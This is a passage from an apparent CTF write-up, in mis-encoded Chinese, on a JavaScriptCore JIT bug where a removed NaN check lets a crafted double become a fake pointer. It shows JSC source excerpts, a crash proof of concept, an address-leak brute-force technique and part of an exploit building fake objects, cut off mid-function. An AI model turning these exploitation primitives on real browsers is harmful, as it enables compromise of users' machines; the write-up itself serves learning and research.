title="snippet1"></a>snippet1</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> float_array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">10</span>) ;<br><span class="hljs-keyword">let</span> value = float_array[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>DFGç¼–è¯‘ç¬¬äºŒè¡Œ <strong>ä»æµ®ç‚¹æ•°ç»„ä¸­å–å…ƒç´ </strong> çš„è¯­å¥æ—¶ä¼šè°ƒç”¨ä»¥ä¸‹å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileGetByValOnFloatTypedArray</span><span class="hljs-params">(Node* node, TypedArrayType type, <span class="hljs-type">const</span> ScopedLambda&lt;std::tuple&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat preferredFormat)&gt;&amp; prefix)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">elementSize</span>(type)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">loadFloat</span>(<span class="hljs-built_in">BaseIndex</span>(storageReg, propertyReg, TimesFour), resultReg);<br>        <span class="hljs-built_in">convertFloatToDouble</span>(resultReg, resultReg);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: &#123;<br>        <span class="hljs-comment">/* [1] */</span><br>        <span class="hljs-built_in">loadDouble</span>(<span class="hljs-built_in">BaseIndex</span>(storageReg, propertyReg, TimesEight), resultReg);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">RELEASE_ASSERT_NOT_REACHED</span>();<br>    &#125;<br>    <span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">if</span> (format == DataFormatJS) &#123;<br>        <span class="hljs-comment">/* [3] */</span><br>        <span class="hljs-comment">// purifyNaN(resultReg);</span><br>        <span class="hljs-built_in">boxDouble</span>(resultReg, resultRegs);<br>        <span class="hljs-built_in">jsValueResult</span>(resultRegs, node);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">ASSERT</span>(format == DataFormatDouble);<br>        <span class="hljs-built_in">doubleResult</span>(resultReg, node);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>ä»æ•°ç»„åŠ è½½doubleåˆ°ä¸´æ—¶å¯„å­˜å™¨resultReg</p></li><li><p>æ£€æŸ¥å‚æ•°formatï¼š</p><ul><li>DataFormatJSï¼šåŠ è½½çš„æµ®ç‚¹æ•°å°†ç”¨ä½œJSValueï¼Œéœ€è¦è½¬åŒ–ä¸ºJSValue</li><li>DataFormatDoubleï¼šåŠ è½½çš„å‚æ•°è¢«ç”¨ä½œæµ®ç‚¹æ•°ï¼Œæ— éœ€è½¬åŒ–æˆJSValue</li></ul><p>è·å–formatçš„å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DataFormat format;<br>std::<span class="hljs-built_in">tie</span>(resultRegs, format, std::ignore) = <span class="hljs-built_in">prefix</span>(DataFormatDouble);<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯JITçŒœæµ‹æ˜¯ä½¿ç”¨è¿‡å¾€è¡Œä¸ºåˆ¤æ–­æµ®ç‚¹æ•°ç”¨é€”</p></li><li><p>å½“formatä¸ºDataFormatJSæ—¶ï¼Œè°ƒç”¨boxDoubleå°†æµ®ç‚¹æ•°è½¬æ¢ä¸ºJSValue</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">boxDouble</span><span class="hljs-params">(FPRReg fpr, JSValueRegs regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">boxDouble</span>(fpr, regs.<span class="hljs-built_in">tagGPR</span>(), regs.<span class="hljs-built_in">payloadGPR</span>());<br>&#125;<br><br><span class="hljs-function">GPRReg <span class="hljs-title">boxDouble</span><span class="hljs-params">(FPRReg fpr, GPRReg gpr, TagRegistersMode mode = HaveTagRegisters)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* [1] */</span><br>    <span class="hljs-built_in">moveDoubleTo64</span>(fpr, gpr);<br>    <span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">if</span> (mode == DoNotHaveTagRegisters)<br>        <span class="hljs-built_in">sub64</span>(<span class="hljs-built_in">TrustedImm64</span>(JSValue::NumberTag), gpr);<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">sub64</span>(GPRInfo::numberTagRegister, gpr);<br>        <span class="hljs-built_in">jitAssertIsJSDouble</span>(gpr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> gpr;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>å°†doubleç§»å…¥é€šç”¨å¯„å­˜å™¨gpr</p></li><li><p>é€šè¿‡å°†gprå‡JSValue::NumberTagå°†doubleç¼–ç ä¸ºJSValue</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">int64_t</span> NumberTag = <span class="hljs-number">0xfffe000000000000</span>ll;<br></code></pre></td></tr></table></figure><p>åŠ 1&lt;&lt;49å’Œå‡0xfffe000000000000æ•ˆæœç›¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">gpr = fpr                             <span class="hljs-comment">// [1] from the above snippet</span><br>gpr = gpr - JSValue::NumberTag;       <span class="hljs-comment">// [2] from the above snippet</span><br>=ï¼ gpr = <span class="hljs-number">0xfffe000012345678</span> - <span class="hljs-number">0xfffe000000000000</span>;<br>=ï¼ gpr = <span class="hljs-number">0xfffe000012345678</span> + <span class="hljs-number">0x0002000000000000</span>; <span class="hljs-comment">// taking 2&#x27;s complement</span><br>=ï¼ gpr = <span class="hljs-number">0x0000000012345678</span>; <span class="hljs-comment">// overflow happens and the top bit is discarded</span><br></code></pre></td></tr></table></figure></li></ul><p>å‡è®¾æ§åˆ¶doubleä¸ºå½¢å¦‚0xfffe000012345678ï¼Œç¼–ç åä¸º0x0000000012345678ä¼šè¢«å½“åšæŒ‡é’ˆè§£æ</p><p>boxDoubleå‡å®šå‚æ•°ä¸ºåˆæ³•doubleæˆ–NaNå³0x7ff8000000000000ï¼Œé¢˜ç›®ä¸­patchæ‰çš„purifyNaNå°±æ˜¯æ£€æŸ¥è¿™ä¸ª</p><h2 id="snippet2"><a href="#snippet2" class="headerlink" title="snippet2"></a>snippet2</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1</span>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">forin</span>(<span class="hljs-params">arg</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æšä¸¾objä¸­æ‰€æœ‰å±æ€§åç§°</li><li>ä»argä¸­å–å‡ºå¯¹åº”å±æ€§åç§°çš„å€¼</li></ul><p>æ‰§è¡Œarg[i]æ—¶ä¼šè¿›å…¥ä»¥ä¸‹è¿‡ç¨‹ç¼–è¯‘ <strong>è·å–å¯¹è±¡çš„å±æ€§å€¼</strong> æ“ä½œï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compile</span><span class="hljs-params">(Node* node)</span></span><br><span class="hljs-function">     <span class="hljs-comment">/* â€¦â€¦ */</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> EnumeratorGetByVal: &#123;</span><br>        <span class="hljs-built_in">compileEnumeratorGetByVal</span>(node);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileEnumeratorGetByVal</span><span class="hljs-params">(Node* node)</span></span><br><span class="hljs-function"></span>&#123;<br>    Edge baseEdge = m_graph.<span class="hljs-built_in">varArgChild</span>(node, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">auto</span> generate = [&amp;] (JSValueRegs baseRegs) &#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>        <br><span class="hljs-comment">/* [1] */</span><br>        <span class="hljs-built_in">compileGetByVal</span>(node, scopedLambda&lt;std::<span class="hljs-built_in">tuple</span>&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat)&gt;([&amp;] (DataFormat) &#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>            <br>         <span class="hljs-comment">/* [2] */</span><br>            <span class="hljs-keyword">return</span> std::tuple &#123; resultRegs, DataFormatJS, CanUseFlush::No &#125;;<br>        &#125;));<br>        <br><span class="hljs-comment">/* â€¦â€¦ */</span><br>    &#125;;<br></code></pre></td></tr></table></figure><ul><li>è¯¥å‡½æ•°è°ƒç”¨ä¸€ä¸ªgenerateé—­åŒ…å‡½æ•°ï¼Œgenerateä¸­åˆè°ƒç”¨compileGetByValå‡½æ•°</li><li>compileGetByValçš„æœ€åä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ªé—­åŒ…ï¼Œè¿™ä¸ªé—­åŒ…æœ€åè¿”å›ä¸€ä¸ªå…ƒç»„<ul><li>ç¬¬ä¸€ä¸ªå€¼æ˜¯å­˜å‚¨å–å‡ºçš„å€¼çš„å¯„å­˜å™¨</li><li>ç¬¬äºŒä¸ªå€¼æ˜¯å‚¨å­˜æ ¼å¼ï¼Œå§‹ç»ˆæ˜¯DataFormatJS</li></ul></li></ul><p>compileGetByValå¤„ç†å„ç§ç±»å‹çš„æ•°ç»„å¯¹è±¡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileGetByVal</span><span class="hljs-params">(Node* node, <span class="hljs-type">const</span> ScopedLambda&lt;std::tuple&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat preferredFormat)&gt;&amp; prefix)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (node-&gt;<span class="hljs-built_in">arrayMode</span>().<span class="hljs-built_in">type</span>()) &#123;<br>    <span class="hljs-comment">/* â€¦â€¦ */</span><br>    <span class="hljs-keyword">case</span> Array::Float64Array: &#123;<br>        TypedArrayType type = node-&gt;<span class="hljs-built_in">arrayMode</span>().<span class="hljs-built_in">typedArrayType</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isInt</span>(type))<br>            <span class="hljs-built_in">compileGetByValOnIntTypedArray</span>(node, type, prefix);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">compileGetByValOnFloatTypedArray</span>(node, type, prefix);<br>    &#125; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœsnippetä¸­çš„argæ˜¯doubleæ•°ç»„ï¼Œä¼šè¿›è¡Œåˆ°Float64Arrayè¿‡ç¨‹ï¼Œè°ƒç”¨snippet1ä¸­æåˆ°çš„æœ‰é—®é¢˜çš„å‡½æ•°</p><h2 id="snippet3"><a href="#snippet3" class="headerlink" title="snippet3"></a>snippet3</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨åŒä¸€å†…å­˜åŒºåŸŸçš„å¦ä¸€è§†å›¾æ”¹å˜Float64Arrayçš„å€¼ä¸ºä¸åˆæ³•çš„double</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> abuf       = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bigint_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> float_buf  = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><br>bigint_buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe_0000_0000_0000</span>;<br></code></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> abuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> fbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><br>obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><br><span class="hljs-comment">/* [1] */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        obj = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        a2.<span class="hljs-property">x</span> = out;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br><br>    t = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br>    <span class="hljs-title function_">trigger</span>(obj, t);<br><br><span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span> ; i ï¼œ <span class="hljs-number">0x10000</span>; i++) &#123;<br>      <span class="hljs-title function_">trigger</span>(fbuf,t);<br>    &#125;<br><br><span class="hljs-comment">/* [3] */</span><br>    bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_12345678n</span>;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t);<br><br><span class="hljs-comment">/* [4] */</span><br>    t.<span class="hljs-property">x</span>;<br>&#125;<br><br><span class="hljs-title function_">main</span>()<br></code></pre></td></tr></table></figure><ul><li>triggeré‡å¤ä¸Šè¿°snippet1å’Œsnippet2ä½¿ç”¨for inå’Œå–å±æ€§çš„æ“ä½œ</li><li>é‡å¤æ‰§è¡Œtriggerä½¿ä¹‹è¢«JITä¼˜åŒ–ç¼–è¯‘</li><li>ä½¿bbuf[0]ä¸åˆæ³•ï¼Œæ­¤æ—¶triggerå°†0xfffe0000_12345678nèµ‹ç»™äº†a2.x</li><li>è°ƒç”¨t.xï¼Œ0x12345678è¢«å½“æˆæŒ‡é’ˆè§£æï¼Œæ®µé”™è¯¯</li></ul><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/stack.png" class title="stack"><h1 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h1><ul><li><p>å¤„ç†&#x3D;&#x3D;&#x3D;æ—¶LHSæ²¡æœ‰ç±»å‹å‡è®¾ï¼Œå‡è®¾RHSç±»å‹ä¸ºJSObjectå¹¶è¿›è¡Œäº†æ£€æŸ¥</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/aslr.png" class title="aslr"></li><li><p>LHSå’ŒRHSçš„æ¯”è¾ƒåªæ˜¯ç®€å•çš„cmp</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/aslr1.png" class title="aslr"></li><li><p>æˆ‘ä»¬å¯ä»¥ä»¤LHSä¸ºå‡æŒ‡é’ˆï¼ŒRHSä¸ºä¸€ä¸ªçœŸæŒ‡é’ˆï¼Œå¯¹æŒ‡é’ˆè¿›è¡Œçˆ†ç ´</p></li></ul><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>JSCå¯¹è±¡çš„å†…å­˜åˆ†å¸ƒï¼š</p><ul><li>JSCellï¼šç±»ä¼¼v8çš„mapï¼Œè¡¨ç¤ºå±æ€§çš„å¸ƒå±€</li><li>butterflyï¼šå‚¨å­˜å±æ€§ï¼Œæ— ç¼–ç å­˜å‚¨</li><li>å†…è”å±æ€§ï¼Œå¯å­˜0x10å­—èŠ‚çš„å†…è”å±æ€§ï¼Œç¼–ç å­˜å‚¨</li></ul><p>æµç¨‹ï¼š</p><img src="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/jsc.png" class title="jsc"><p>å®˜æ–¹expï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// STEP1</span><br><span class="hljs-keyword">let</span> fake1 = &#123;<span class="hljs-attr">c</span>:<span class="hljs-number">1.1</span>, <span class="hljs-attr">d</span>:<span class="hljs-number">2.2</span>&#125;;<br><span class="hljs-keyword">let</span> fake2 = &#123;<span class="hljs-attr">c</span>:<span class="hljs-number">1.1</span>, <span class="hljs-attr">d</span>:&#123;&#125;&#125;;<br><span class="hljs-comment">// END STEP1</span><br><br><span class="hljs-comment">// STEP2</span><br>fake2[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">1</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">2</span>] = <span class="hljs-number">1.1</span>;<br>fake2[<span class="hljs-number">3</span>] = <span class="hljs-number">1.1</span>;<br><span class="hljs-keyword">let</span> abuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">let</span> bbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(abuf);<br><span class="hljs-keyword">let</span> fbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br><span class="hljs-keyword">let</span> ffbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(abuf);<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x01001800000099f0n</span>-<span class="hljs-number">0x0002000000000000n</span>;<br>fake1.<span class="hljs-property">c</span> = ffbuf[<span class="hljs-number">0</span>];<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0100180600009a60n</span>;<br>fake2[<span class="hljs-number">0</span>] = ffbuf[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// END STEP2</span><br>obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">a</span>) &#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bftrigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        obj = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        <span class="hljs-keyword">if</span> (out === a2.<span class="hljs-property">x</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;    <br>    &#125;<br>&#125;<br>obj2 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1234</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1234</span>&#125;;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">arg, a2</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj2) &#123;<br>        obj2 = [<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>        a2.<span class="hljs-property">x</span> = out;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> t2 = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br><span class="hljs-title function_">trigger</span>(obj, t2);<br>bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x00000000_00000000n</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x800</span>; i++) &#123;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t2);<br>&#125;<br><span class="hljs-keyword">let</span> t = &#123;<span class="hljs-attr">x</span>: &#123;&#125;&#125;;<br><span class="hljs-title function_">bftrigger</span>(obj, t);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x800</span>; i++) &#123;<br>    <span class="hljs-title function_">bftrigger</span>(fbuf, t);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">object_to_leak</span>) &#123;<br>    <span class="hljs-keyword">let</span> addr = <span class="hljs-number">0x7f00_0000_0000n</span>;<br>    <span class="hljs-keyword">let</span> to_leak = &#123;<span class="hljs-attr">x</span>: object_to_leak&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i=<span class="hljs-number">0n</span>; i&lt;<span class="hljs-number">0xff_ffff_ffffn</span>; i+=<span class="hljs-number">0x1000000n</span>) &#123;<br>        <span class="hljs-keyword">let</span> current_addr = addr + i + <span class="hljs-number">0x4f8140n</span>;<br>        <span class="hljs-keyword">if</span> ((i&amp;<span class="hljs-number">0xfffffffffn</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-title function_">print</span>(current_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        &#125;<br>        bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_00000000n</span>+current_addr;<br>        <span class="hljs-keyword">let</span> result = <span class="hljs-title function_">bftrigger</span>(fbuf, to_leak);<br>        <span class="hljs-keyword">if</span> (result) &#123;<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;Found the address at: 0x&#x27;</span>+ current_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>            <span class="hljs-keyword">return</span> current_addr;<br>        &#125;<br>    &#125;    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// STEP3</span><br>    <span class="hljs-keyword">let</span> fake1_addr = <span class="hljs-title function_">leak</span>(fake1);<br>    <span class="hljs-keyword">if</span> (fake1_addr==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span><br>    &#125;    <br>    fake1_addr = fake1_addr+<span 